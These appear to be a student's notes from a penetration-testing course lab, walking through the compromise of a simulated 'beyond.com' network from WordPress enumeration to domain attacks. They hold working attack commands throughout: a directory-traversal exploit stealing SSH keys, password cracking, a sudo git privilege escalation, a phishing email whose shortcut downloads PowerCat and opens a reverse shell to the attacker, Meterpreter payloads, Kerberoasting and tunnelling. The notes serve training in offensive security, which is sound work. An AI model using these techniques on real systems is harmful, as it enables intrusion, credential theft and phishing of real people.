- Enumerating the Public Network
- Attacking a Public Machine
- Gaining Access to the Internal Network
- Enumerating the Internal Network
- Attacking an Internal Web Application
- Gaining Access to the Domain Controller

# Enumerating the Public network

### MAILSRV1

1. Set up work environment for pentest
	- [Note]:
		- `Structuring and isolating data and settings for multiple penetration tests can be quite the challenge. By reusing a Kali VM we could accidentally expose previous-client data to new networks. Therefore, it is recommended to use a fresh Kali image for every assessment.`
	- create a /home/kali/beyond directory, and create two directories named after the two target machines we have access to, create a creds.txt text file to keep track of identified valid credentials and users.
		- `mkdir beyond`
		`cd beyond`
		`mkdir mailsrv1`
		`mkdir websrv1`
		`touch creds.txt`
	- Let's begin with a port scan of MAILSRV1 using *Nmap*
		- `sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242`
	- [Note]:
		- `In a real penetration test, we would also use passive information gathering techniques such as Google Dorks and leaked password databases to obtain additional information. This would potentially provide us with usernames, passwords, and sensitive information.`
	- Result:
		-  Target machine is a Windows system running an *IIS web server* and a *hMailServer*. This is not surprising as the machine is named MAILSRV1 in the topology
	- As we may not be familiar with hMailServer,3:1 we can research this application by browsing the application's web page. It states that hMailServer is a free, open source e-mail server for Microsoft Windows.
	- To identify potential vulnerabilities in hMailServer, we can use a search engine to find CVEs and public exploits. Unfortunately, the search didn't provide any meaningful results
		- [Note]:
			- `Even if we had found a vulnerability with a matching exploit providing the code execution, we should not skip the remaining enumeration steps. While we may get access to the target system, we could potentially miss out on vital data or information for other services and systems.`
	- Next, let's enumerate the IIS web server.
	- IIS only displays the default welcome page. Let's try to identify directories and files by using **gobuster**.
		- `gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config`
	- [Note]:
		- `Not every enumeration technique needs to provide actionable results. In the initial information gathering phase, it is important to perform a variety of enumeration methods to get a complete picture of a system.`

Summary:
	- While enumerating MAILSRV1 so far. First, we launched a port scan with Nmap, which identified a running IIS web server and hMailServer. In addition, we established that the target is running Windows, then enumerated the running web server more closely. Unfortunately, this didn't provide any actionable information for us.

	- We cannot use the mail server at this moment. If we identify valid credentials and targets later on in the penetration test, we could perhaps use the mail server to send a phishing email, for example.

### WEBSRV1

- [Note]:
	- `In a real penetration test, we could scan MAILSRV1 and WEBSRV1 in a parallel fashion. Meaning, that we could perform the scans at the same time to save valuable time for the client. If we do so, it's vital to perform the scans in a structured way to not mix up results or miss findings.`

- As before, we'll begin with an nmap scan of the target machine.
	- `sudo nmap -sC -sV -oN websrv1/nmap 192.168.50.244`
- Google Search
	- Let's copy the "OpenSSH 8.9p1 Ubuntu 3" string in to a search engine. The results contain a link to the Ubuntu Launchpad web page, which contains a list of OpenSSH version information mapped to specific Ubuntu releases.1 In our example, the version is mapped to Jammy Jellyfish, which is the version name for Ubuntu 22.04.
- For port 22, we currently only have the option to perform a password attack. Because we don't have any username or password information, we should analyze other services first. Therefore, let's enumerate port 80 running Apache 2.4.52.
	- [Note]:
		- `We should also search for potential vulnerabilities in Apache 2.4.52 as we did for hMailServer. As this will yield no actionable results, we'll skip it.`
- View webpage
- *View Page Source*
	- For a majority of frameworks and web solutions, such as CMS's,2 we can find artifacts and string indicators in the source code.
- Google Search
	- We notice that the links contain the strings "wp-content" and "wp-includes". By entering these keywords in a search engine, we can establish that the page uses WordPress
- To confirm this and potentially provide more information about the technology stack in use, we can use **whatweb**
	- `whatweb http://192.168.50.244`
- [Note]:
	- `wp` WordPress themes and plugins are written by the community and many vulnerabilities are improperly patched or are simply never fixed at all. This makes plugins and themes a great target for compromise.
- *WPScan*
	- WordPress vulnerability scanner
		- This tool attempts to determine the WordPress versions, themes, and plugins as well as their vulnerabilities.
	- WPScan looks up component vulnerabilities in the *WordPress Vulnerability Database* which requires an API token. A limited API key can be obtained for free by registering an account on the WPScan homepage. However, even without providing an API key, WPScan is a great tool to enumerate WordPress instances.
	- To perform the scan without an API key, we'll provide the URL of the target for **--url**, set the plugin detection to aggressive, and specify to enumerate all popular plugins by entering **p** as an argument to **--enumerate**. In addition, we'll use **-o** to create an output file.
		- `wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan`
		- `cat websrv1/wpscan`
	- WPScan discovered six active plugins in the target WordPress instance: *akismet classic-editor contact-form-7 duplicator elementor and wordpress-seo.* The output also states that the Duplicator plugin version is outdated.
- Use *searchsploit* to find possible exploits for vulnerabilities in the installed plugins. 
	- `searchsploit duplicator`

Summary:
- Let's summarize what information we obtained about WEBSRV1 in this section. We learned that the target machine is an Ubuntu 22.04 system with two open ports: 22 and 80. A WordPress instance runs on port 80 with various active plugins. A plugin named Duplicator is outdated and a SearchSploit query provided us with two vulnerability entries matching the version.

# Attacking a Public Machine

### Initial Foothold

Scenario:
- We used SearchSploit to find exploits for Duplicator 1.3.26. SearchSploit provided two exploits for this version, one of which was an exploit for Metasploit. Let's use SearchSploit to examine the other displayed exploit by providing the ExploitDB ID from Listing 7 to **-x**.
		- `searchsploit -x 50420`
- Listing 9 shows the Python code to exploit the vulnerability tracked as CVE-2020-11738.1 Notice that the Python script sends a GET request to a URL and adds a filename prepended with "dot dot slash" expressions.
- Let's copy the Python script to the **/home/kali/beyond/websrv1** directory using SearchSploit's **-m** option with the ExploitDB ID.
		- `cd beyond/websrv1`
		- `searchsploit -m 50420`
- To use the script, we have to provide the URL of our target and the file we want to retrieve. Let's attempt to read and display the contents of **/etc/passwd** both to confirm that the target is indeed vulnerable and to obtain user account names of the system.
	- `python3 50420.py http://192.168.50.244 /etc/passwd`
- We successfully obtained the contents of **/etc/passwd** and identified two user accounts, *daniela* and *marcus*. Let's add them to **creds.txt**.
- As we have learned in the *Common Web Application Attacks* Module, there are several files we can attempt to retrieve via Directory Traversal in order to obtain access to a system. One of the most common methods is to retrieve an SSH private key configured with permissions that are too open.
- [Note]:
	- In this example, we'll attempt to retrieve an SSH private key with the name **id_rsa**. The name will differ depending on the specified type when creating an SSH private key with ssh-keygen.2 For example, when choosing ecdsa as the type, the resulting SSH private key is named **id_ecdsa** by default.
- Let's check for SSH private keys with the name **id_rsa** in the home directories of daniela and marcus.
	- `python3 50420.py http://192.168.50.244 /home/marcus/.ssh/id_rsa`
		- result -> fail
	- `python3 50420.py http://192.168.50.244 /home/daniela/.ssh/id_rsa`
	-  Let's save the key in a file named **id_rsa** in the current directory.
- Next, let's attempt to leverage this key to access WEBSRV1 as daniela via SSH. To do so, we have to modify the file permissions as we have done several times in this course.
	- `chmod 600 id_rsa`
	- `ssh -i id_rsa daniela@192.168.50.244`
	- result -> requires passphrase
- Attempt to crack the passphrase using **ssh2john** and **john** with the **rockyou.txt** wordlist. After a few moments, the cracking attempt is successful as shown in the following listing
	- `ssh2john id_rsa > ssh.hash`
	- `john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash`
	- result -> tequieromucho -> success
- Attempt to access the system again via SSH by providing the passphrase
	- `ssh -i id_rsa daniela@192.168.50.244`
-  Add the cracked passphrase to the creds.txt file in the work environment directory

### A Link to the Past

- Local enumeration with *linPEAS*
-  copy **linpeas.sh** to the **websrv1** directory and start a Python3 web server to serve it.
	- `cp /usr/share/peass/linpeas/linpeas.sh .`
	- `python3 -m http.server 80`
- Download the enumeration script with **wget**
	- `wget http://192.168.119.5/linpeas.sh`
- Use **chmod** to make the script executable
	- `chmod a+x ./linpeas.sh`
- Run the script
	- `./linpeas.sh`
- Since we have already enumerated MAILSRV1 without any actionable results and this machine is not connected to the internal network, we have to discover sensitive information, such as credentials, to get a foothold in the internal network. To obtain files and data from other users and the system, we'll make elevating our privileges our priority.
- Reviewing *linPEAS*
	- Listing 21 shows that daniela can run **/usr/bin/git** with sudo privileges without entering a password.
	- Before we try to leverage this finding into privilege escalation, let's finish reviewing the linPEAS results. Otherwise, we may miss some crucial findings.
	- The next interesting section is *8Analyzing Wordpress Files*, which contains a clear-text password used for database access.
		-  Save the password in the **creds.txt** file 
	- Another interesting aspect of this finding is the path displayed starts with **/srv/www/wordpress/**. The WordPress instance is not installed in **/var/www/html** where web applications are commonly found on Debian-based Linux systems. While this is not an actionable result, we should keep it in mind for future steps
	- Continue reviewing the linPEAS results. In the Analyzing *Github Files* section, we'll find that the WordPress directory is a *Git repository*.
		-  Directory is owned by root
		- Can leverage sudo to use Git commands in a privileged context and therefore search the repository for sensitive information.
- Summary of linPeas output:
	- WEBSRV1 runs Ubuntu 22.04 and is not connected to the internal network. The *sudoers* file contains an entry allowing daniela to run **/usr/bin/git** with elevated privileges without providing a password. In addition, we learned that the WordPress directory is a Git repository. Finally, we obtained a clear-text password in the database connection settings for WordPress.
	- 3 Potential Attack Vectors
		- Abuse sudo command /usr/bin/git
		- Use sudo to search the Git repository
		- Attempt to access other users with the WordPress database password
- Consult *GTFOBins*
	- To find potential abuses when a binary such as git is allowed to run with sudo
	- Attempt to privesc from GTFOBins
		- `sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help`
		- result -> failed
	- Attempt 2 (using *less* pager)
		- `sudo git -p help config`
		- To execute code through the pager, we can enter ! followed by a command or path to an executable file. 
		- We can enter a path to a shell. Let's use **/bin/bash**
			- `!/bin/bash`
			- `whoami`
			- result -> root
	- We successfully elevated our privileges on WEBSRV1.
	- Continue to search the Git repository for sensitive information
	- Change our current directory to the Git repository
		- `cd /srv/www/wordpress/`
	- Display the state of the Git working directory with **git status**
		- `git status`
	- Show commit history with **git log**
		- `git log`
	- Switch back to a specific commit with **git checkout** and a commit hash.
		- could distrupt operations
	- A better approach is to use **git show**, which shows differences between commits
		- `git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1`
		- result -> creds
	- [Note]:
		- The approach of automating tasks with *sshpass* is commonly used to provide a password in an non-interactive way for scripts
	- Add creds to creds.txt
	- [Note]:
		- [In a real assessment, we should run linPEAS again, once we have obtained privileged access to the system. Because the tool can now access files of other users and the system, it may discover sensitive information and data that wasn't accessible when running as daniela.]

Summary:
- We used the linPEAS automated enumeration script to identify potentially sensitive information and privilege escalation vectors. The script identified that /usr/bin/git can be run with sudo as user daniela, the WordPress directory is a Git repository, and a cleartext password is used in the WordPress database settings. By abusing the sudo command, we successfully elevated our privileges. Then, we identified a previously removed bash script in the Git repository and displayed it. This script contained a new username and password.

# Gaining Access to the Internal Network

### Domain Credentials 
			
Scenario:
- In this section, we'll attempt to identify valid combinations of usernames and passwords on MAILSRV1.

Example Start:
- Use the current information in our creds.txt file to create a list of usernames and passwords
	- `cat creds.txt`
- Create password list with *tequieromucho, DanielKeyboard3311, and dqsTwTpZPn#nL*.
	- `cat usernames.txt`
	- `cat passwords.txt
- Use **crackmapexec** and check these credentials against SMB on MAILSRV1.
	- `crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success`
- Now that we have valid domain credentials, we need to come up with a plan for our next steps
- 2 options
	- keep enumerating SMB
	- prep malware and phishing email as john to daniela and marcus
- [Note]:
	- We should be aware that CrackMapExec outputs STATUS_LOGON_FAILURE when a password for an existing user is not correct, but also when a user does not exist at all. Therefore, we cannot be sure at this point that the domain user accounts daniela and marcus even exist.
- 1st option
	- Leverage CrackMapExec to list the SMB shares and their permissions on MAILSRV1 by providing **--shares** and *john*'s credentials
		- `crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares`

Summary:
- We used the information we retrieved in the previous Learning Unit and leveraged it in a password attack against MAILSRV1. This password attack resulted in discovering one valid set of credentials. Then, we enumerated the SMB shares on MAILSRV1 as john without any actionable results.

### Phishing for Access

Set up:
- For this attack, we have to set up a WebDAV server, a Python3 web server, a Netcat listener, and prepare the Windows Library and shortcut files.

Start:
- Set up the WebDAV share on our Kali machine on port 80 with *wsgidav*.
	- `mkdir /home/kali/beyond/webdav`
	- `/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/`
- Now, let's connect to WINPREP via RDP as *offsec* with a password of *lab* in order to prepare the Windows Library and shortcut files. 
- Once connected, we'll open *Visual Studio Code* and create a new text file on the desktop named **config.Library-ms**.
- Now, let's copy the Windows Library code we previously used in the *Client-Side Attacks Module*, paste it into Visual Studio Code, and check that the IP address points to our Kali machine.
	- 
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.5</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

- Let's save the file and transfer it to **/home/kali/beyond** on our Kali machine.
- Next, we'll create the shortcut file on WINPREP. For this, we'll right-click on the Desktop and select *New > Shortcut*. 
- **A victim double-clicking the shortcut file will download PowerCat and create a reverse shell**. We can enter the following command to achieve this:
	- `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"`
- Once we enter the command and **install** as shortcut file name, we can transfer the resulting shortcut file to our Kali machine into the WebDAV directory.
- Our next step is to serve PowerCat via a Python3 web server. Let's copy **powercat.ps1** to **/home/kali/beyond** and serve it on port 8000 as we have specified in the shortcut's PowerShell command.
	- `cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .`
	- `python3 -m http.server 8000`
- Start a Netcat listener on port 4444 in a new terminal tab to catch the incoming reverse shell from PowerCat.
	- `nc -lvnp 4444`
- [Note]:
	- We could also use the WebDAV share to serve Powercat instead of the Python3 web server. However, serving the file via another port provides us additional flexibility.
- *swaks*
	- Command-line SMTP test tool
- As a first step, let's create the body of the email containing our pretext.
	- Because we don't have specific information about any of the users, we have to use something more generic.
	- [Note]:
		- Including information only known to employees or staff will tremendously increase our chances that an attachment is opened.
- We'll create the **body.txt** file in **/home/kali/beyond** with the following text:

```
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```
- [Note]:
	- In a real assessment we should also use passive information gathering techniques to obtain more information about a potential target. Based on this information, we could create more tailored emails and improve our chances of success tremendously.
- Now we are ready to build the swaks command to send the emails. Once entered, we have to provide the credentials of *john*:
	- `sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap`
		- **-t** = Recipients of the email
		- **--from** = Name on the email envelope (sender)
		- **--atach** = Windows Library file
		- **--suppress-data** = Summarize information regarding the SMTP transactions
		- **--header** = **Subject: Staging Script**
		- **--body** = **body.txt**
		- **--server** = IP address of MAILSRV1 
		- **-ap** = Enable password authentication
		- creds = `john:dqsTwTpZPn#nL`
- Success
	- `whoami;hostname;ipconfig`
	- result -> Listing 40 shows that we landed on the CLIENTWK1 system as domain user marcus. In addition, the IP address of the system is 172.16.6.243/24, indicating an internal IP range. We should also document the IP address and network information, such as the subnet and gateway in our workspace directory.

Summary:
- First, we set up our Kali machine to provide the necessary services and files for our attack. Then, we prepared a Windows Library and shortcut file on WINPREP. Once we sent our email with the attachment, we received an incoming reverse shell from CLIENTWK1 in the internal network.

# Enumerating the Internal Network

### Situational Awareness

Scenario:
- We'll attempt to gain situational awareness on the CLIENTWK1 system and the internal network. First, we'll perform local enumeration on CLIENTWK1 to obtain an overview of the system and identify potentially valuable information and data. Then, we'll enumerate the domain to discover users, computers, domain administrators, and potential vectors for lateral movement and privilege escalation.
	- [Note]:
		- `For this Learning Unit, we'll not explicitly store every result in our workspace directory on Kali. However, to get used to the documenting process you should create notes of all findings and information while following along.`

Start:
- Let's copy the 64-bit winPEAS executable to the directory served by the Python3 web server
- On CLIENTWK1, we'll change the current directory to the home directory for marcus and download winPEAS from our Kali machine. Once downloaded, we'll launch it.
	- `cd C:\Users\marcus`
	- `iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe`
	- `.\winPEAS.exe`
- *Basic System Information*
	- As we have learned in the course, winPEAS may falsely detect Windows 11 as Windows 10, so let's manually check the operating system with **systeminfo**.
		- `systeminfo`
[Note]:
	- `With experience, a penetration tester will develop a sense for which information from automated tools should be double-checked.`
- *AV section*
	- No AV has been detected. This will make the use of other tools and payloads such as Meterpreter much easier.
- *Network Ifaces and known hosts and DNS cached*
	- Listing 45 shows that the DNS entries for **mailsrv1.beyond.com** (172.16.6.254) and **dcsrv1.beyond.com** (172.16.6.240) are cached on CLIENTWK1. Based on the name, we can assume that DCSRV1 is the domain controller of the **beyond.com** *domain*.
	- Furthermore, because MAILSRV1 is detected with the internal IP address of 172.16.6.254 and we enumerated the machine from an external perspective via 192.168.50.242, we can safely assume that this is a dual-homed host.
- As we did for credentials, let's create a text file named **computer.txt** in **/home/kali/beyond/** to document identified internal machines and additional information about them.
	- Example:
		- 
```
172.16.6.240 - DCSRV1.BEYOND.COM
-> Domain Controller

172.16.6.254 - MAILSRV1.BEYOND.COM
-> Mail Server
-> Dual Homed Host (External IP: 192.168.50.242)

172.16.6.243 - CLIENTWK1.BEYOND.COM
-> User _marcus_ fetches emails on this machine
```
- Reviewing the rest of the winPEAS results, we don't find any actionable information to attempt a potential privilege escalation attack. However, we should remind ourselves that we are in a simulated penetration test and not in a CTF lab environment. Therefore, it is not necessary to get administrative privileges on every machine.
- Let's start enumerating the AD environment and its objects.
- we'll use *BloodHound* with the *SharpHound.ps1* collector, which we discussed in the *Active Directory Introduction and Enumeration Module*.
- First, we'll copy the PowerShell collector to /home/kali/beyond in a new terminal tab to serve it via the Python3 web server on port 8000.
	- `cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .`
- download the PowerShell script on the target machine
	- `iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1`
	- `powershell -ep bypass`
	- `. .\SharpHound.ps1`
- Execute **Invoke-BloodHound** by providing **All** to **-CollectionMethod** to invoke all available collection methods.
	- `Invoke-BloodHound -CollectionMethod All`
	- `dir`
- Transfer the file to our Kali machine then start neo4j and BloodHound
- **BloodHound** review
	-  Contains various pre-built queries such as *Find all Domain Admins*
	- These queries are built with the *Cypher Query Language*
	- BloodHound also allows us to enter custom queries via the *Raw Query* function at the bottom of the GUI.
	- Let's build a raw query to display all computers identified by the collector
		- `MATCH (m:Computer) RETURN m`
			- **MATCH** = select a set of objects
			- **m** = variable set containing all objects in the database with the property **Computer**
			- **RETURN** = keyword to build the resulting graph based on the objects in m
	- Furthermore, it discovered another machine named INTERNALSRV1.
	- Let's obtain the IP address for INTERNALSRV1 with **nslookup**.
		- `nslookup INTERNALSRV1.BEYOND.COM`
	- Add IP to **computer.txt**
	- Next, we want to display all user accounts on the domain.
		- `MATCH (m:User) RETURN m`
	- Update **usernames.txt**
- To be able to use some of BloodHound's pre-built queries, we can mark *marcus* (interactive shell on CLIENTWK1) and *john* (valid credentials) as Owned.
- Next, let's display all domain administrators by using the pre-built *Find all Domain Admins* query under the *Analysis* tab.
	- result -> shows that apart from the default domain *Administrator* account, *beccy* is also a member of the *Domain Admins* group.
	- [Note]:
		- In a real penetration test, we should also examine domain groups and GPOs. Enumerating both is often a powerful method to elevate our privileges in the domain or gain access to other systems. For this simulated penetration test, we'll skip these two enumeration steps as they provide no additional value for this environment.
- Next, let's use some of the pre-built queries to find potential vectors to elevate our privileges or gain access to other systems. We'll run the following pre-built queries:
	- *Find Workstations where Domain Users can RDP*
	- *Find Servers where Domain Users can RDP*
	- *Find Computers where Domain Users are Local Admin*
	- *Shortest Path to Domain Admins from Owned Principals*
- These pre-built queries are often a quick and powerful way to identify low hanging fruit in our quest to elevate our privileges and gain access to other systems. Because BloodHound didn't provide us with actionable vectors, we have to resort to other methods.
	- [Note]:
		- We could have also used PowerView or LDAP queries to obtain all of this information. However, in most penetration tests, we want to use BloodHound first as the output of the other methods can be quite overwhelming. We can also use raw or pre-built queries to identify highly complex attack vectors and display them in an interactive graphical view.

Summary:
- We identified four computer objects and four user accounts and learned that beccy is a member of the Domain Admins group, making it a high value target. Furthermore, we ruled out some vectors that would have provided us access to other systems or privileged users.

### Services and Sessions

Scenario:
- we'll further enumerate the target network to identify potential attack vectors. First, we'll review all active user sessions on machines. Then, we'll examine user accounts for the existence of *SPN*s. Finally, we'll leverage tools such as Nmap and *CrackMapExec* via a *SOCKS5* proxy to identify accessible services.
- To review active sessions, we'll again use a custom query in BloodHound.
	- Since Cypher is a querying language, we can build a relationship query with the following syntax **(NODES)-[:RELATIONSHIP]->(NODES)**.
- The relationship for our use case is **[:HasSession]**. The first node of the relationship specified by a property is **(c:Computer)** and the second is **(m:User)**. Meaning, the edge between the two nodes has its source at the computer object. We'll use **p** to store and display the data.
	- `MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p`
	- result -> Interestingly, the previously identified domain administrator account *becc*y has an active session on MAILSRV1. If we manage to get privileged access to this machine, we can potentially extract the NTLM hash for this user.
	- The user of the third active session is displayed as a SID. BloodHound uses this representation of a principal when the domain identifier of the SID is from a local machine. For this session, this means that the local *Administrator* (indicated by RID 500) has an active session on INTERNALSRV1.
- Our next step is to identify all kerberoastable users in the domain. To do so, we can use the List all Kerberoastable Accounts pre-built query in BloodHound.
	- shows that apart from *krbtgt, daniela* is also kerberoastable.
		- [Note]:
			- The krbtgt user account acts as service account for the Key Distribution Center (KDC)4 and is responsible for encrypting and signing Kerberos tickets. When a domain is set up, a password is randomly generated for this user account, making a password attack unfeasible. Therefore, we can often safely skip krbtgt in the context of Kerberoasting.
- Examine the SPN for daniela in BloodHound via the Node Info menu by clicking on the node.
	- Figure 15 shows the mapped SPN **http/internalsrv1.beyond.com**. Based on this, we can assume that a web server is running on INTERNALSRV1. Once we've performed Kerberoasting and potentially obtained the plaintext password for *daniela*, we may use it to access INTERNALSRV1.
	- However, as we have stated before, finding an actionable vector should not interrupt our enumeration process. We should collect all information, prioritize it, and then perform potential attacks.
- Therefore, let's set up a *SOCKS5* proxy to perform network enumeration via **Nmap and **CrackMapExec** in order to identify accessible services, open ports, and *SMB* settings.
	1. We'll create a staged Meterpreter TCP reverse shell as an executable file with **msfvenom**. Since we can reuse the binary throughout the domain, we can store it in **/home/kali/beyond**.
		- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe`
	2. Start a multi/handler listener with the corresponding settings in Metasploit. In addition, we'll **set** the option **ExitOnSession** to **fals**e. It specifies that the listener stays active for new sessions without the need to restart it for every incoming session.
		- `sudo msfconsole -q`
		- `use multi/handler`
		- `set payload windows/x64/meterpreter/reverse_tcp`
		- `set LHOST 192.168.119.5`
		- `set LPORT 443`
		- `set ExitOnSession false`
		- `run -j`
	3. Download and execute **met.exe** on CLIENTWK1.
		- `iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe`
		- `.\met.exe``
	4. Once session 1 is opened, we can use **multi/manage/autoroute** and **auxiliary/server/socks_proxy** to create a SOCKS5 proxy to access the internal network from our Kali box as we learned in the "The Metasploit Framework" Module.
		- `use multi/manage/autoroute`
		- `set session 1`
		- `run`
		- `use auxiliary/server/socks_proxy`
		- `set SRVHOST 127.0.0.1`
		- `set VERSION 5`
		- `run -j`
	5. Confirm **/etc/proxychains4.conf** settings.
		- `cat /etc/proxychains4.conf`
	6. Begin with CrackMapExec's SMB module to retrieve basic information of the identified servers (such as SMB settings). We'll also provide the credentials for *john* to list the SMB shares and their permissions with **--shares**
		- `proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares`
			- [Note]:
				- `CrackMapExec version 5.4.0 may throw the error The NETBIOS connection with the remote host is timed out for DCSRV1, or doesn't provide any output at all. Version 5.4.1 contains a fix to address this issue`
		- result -> The output also states that MAILSRV1 and INTERNALSRV1 have SMB signing set to False. Without this security mechanism enabled, we can potentially perform *relay attacks* if we can force an authentication request.
- Next, let's use **Nmap** to perform a port scan on ports commonly used by web applications and FTP servers targeting MAILSRV1, DCSRV1, and INTERNALSRV1. We have to specify **-sT** to perform a TCP connect scan. Otherwise, Nmap will not work over Proxychains.
	- `sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.6.240 172.16.6.241 172.16.6.254`
- While we could use the SOCKS5 proxy and proxychains to browse to the open port on 172.16.6.241, we'll use **Chisel** as it provides a more stable and interactive browser session. 
	1. Download the Windows and Linux amd64 versions and extract the binaries in **/home/kali/beyond/**.
	2. On our Kali machine, we'll use *Chisel* in server mode to receive incoming connections on port 8080. In addition, we'll add the **--reverse** option to allow reverse port forwarding.
		- `chmod a+x chisel`
		- `./chisel server -p 8080 --reverse`
	3. Then, we'll transfer the extracted **chisel.exe** binary to CLIENTWK1 by using Meterpreter's **upload** command.
		- `sessions -i 1`
		- `upload chisel.exe C:\\Users\\marcus\\chisel.exe`
	4. Now, we can enter **shell** and utilize *Chisel* in *client mode* to connect back to our Kali machine on port 8080. We'll create a reverse port forward with the syntax **R:localport:remotehost:remoteport**. In our case, the remote host and port are 172.16.6.241 and 80. The local port we want to utilize is 80.
		- `chisel.exe client 192.168.119.5:8080 R:80:172.16.6.241:80`
- Once Chisel connects, we can browse to port 80 on 172.16.6.241 via port 80 on our Kali machine (127.0.0.1) by using Firefox:
- Let's browse to the dashboard login page for WordPress at **http://127.0.0.1/wordpress/wp-admin** and try to log into it with credentials we've discovered so far.
	- result -> The navigation bar in Firefox shows that we were redirected to **internalsrv1.beyond.com**. We can assume that the WordPress instance has the DNS name set as this address instead of the IP address. Because our machine doesn't have information about this DNS name, we cannot connect to the page.
- To be able to fully use the web application, we'll add **internalsrv1.beyond.com** via **127.0.0.1** to **/etc/hosts**.
	- result -> login page is now displayed correctly.

Summary:
-  First, we enumerated all active sessions. Interestingly, the domain administrator *beccy* has an active session on MAILSRV1. Next, we identified *daniela* as a kerberoastable user due to the **http/internalsrv1.beyond.com** SPN.
- Then, we set up a SOCKS5 proxy with Metasploit and used CrackMapExec and Nmap to perform network enumeration. The output revealed that MAILSRV1 and INTERNALSRV1 each have an accessible web server and SMB signing disabled. Via Chisel, we were able to browse to the WordPress instance on INTERNALSRV1. However, none of the credentials worked to log in to the WordPress login page.

# Attacking an Internal Web Application

### Speak Kerberoast and Enter

Secnario:
- Based on the information from the previous Learning Unit, the web application on INTERNALSRV1 is the most promising target at the moment. Because it is a WordPress site, we could use **WPScan** again or use password attacks to successfully log in to WordPress's dashboard.
- Every time we obtain new information, we should reevaluate what we already know.
- For our situation, this means that we already obtained the information that *daniela* has an http SPN mapped to INTERNALSRV1. Our assumption at this point is that *daniela* may be able to log in to the WordPress login page successfully.
- Since *daniela* is kerberoastable, we can attempt to retrieve the user's password this way. If we can crack the *TGS-REP* password hash, we may be able to log in to WordPress and gain further access to INTERNALSRV1.
- If this attack vector fails, we can use WPScan and other web application enumeration tools to identify potential vulnerabilities on INTERNALSRV1 or switch targets to MAILSRV1.

Start:
- Let's perform Kerberoasting on Kali with *impacket-GetUserSPNs* over the SOCKS5 proxy using Proxychains. To obtain the TGS-REP hash for *daniela*, we have to provide the credentials of a domain user. Because we only have one valid set of credentials, we'll use *john*.
	- `proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.6.240 beyond.com/john`
	- result -> hash
- Store the hash in /home/kali/beyond/daniela.hash and launch Hashcat to crack it.
	- `sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force`
- Success. Let's store the username and password in **creds.txt**.
- [Note]:
	- We already established that no domain user has local Administrator privileges on any domain computers and we cannot use RDP to log in to them. However, we may be able to use protocols such as WinRM to access other systems.
- Next, let's try to log in to WordPress at **/wp-admin** via our forwarded port.

### Abuse a WordPress Plugin for a Relay Attack

Scenario:
- In the previous section, we retrieved the plaintext password for *daniela* and gained access to the WordPress dashboard on INTERNALSRV1. Let's review some of the settings and plugins.

Start:
- We'll begin with the configured users:
- Figure 20 shows *daniela* is the only user. Next, let's check *Settings > General*.
- The *WordPress Address (URL)* and *Site Address (URL)* are DNS names as we assumed. All other settings in *Settings* are mostly default values. Let's review the installed plugins next.
- Let's click on *Manage*, which brings us to the plugin configuration page. Clicking through the menus and settings, we discover the *Backup directory* path.
	- Figure 23 shows that we can enter a path in this field, which will be used for storing the backup. We may abuse this functionality to force an authentication of the underlying system.
- Let's pause here for a moment and plan our next steps. At the moment, there are two promising attack vectors.
	1. The first is to upload a malicious WordPress plugin to INTERNALSRV1. By preparing and uploading a web shell or reverse shell, we may be able to obtain code execution on the underlying system.
	2. For the second attack vector, we have to review the BloodHound results again and make some assumptions. As we have discovered, the local *Administrator* account has an active session on INTERNALSRV1. Based on this session, we can make the assumption that this user account is used to run the WordPress instance.
		- Furthermore, it's not uncommon that the local Administrator accounts across computers in a domain are set up with the same password. Let's assume this is true for the target environment.
		- We also learned that the domain administrator beccy has an active session on MAILSRV1 and therefore, the credentials of the user may be cached on the system.
		- Due to SMB signing being disabled on MAILSRV1 and INTERNALSRV1, a relay attack is possible if we can force an authentication.
		- Finally, we identified the Backup directory path field in the WordPress *Backup Migration* plugin containing the path for the backup destination. This may allow us to force such an authentication request.

Plan:
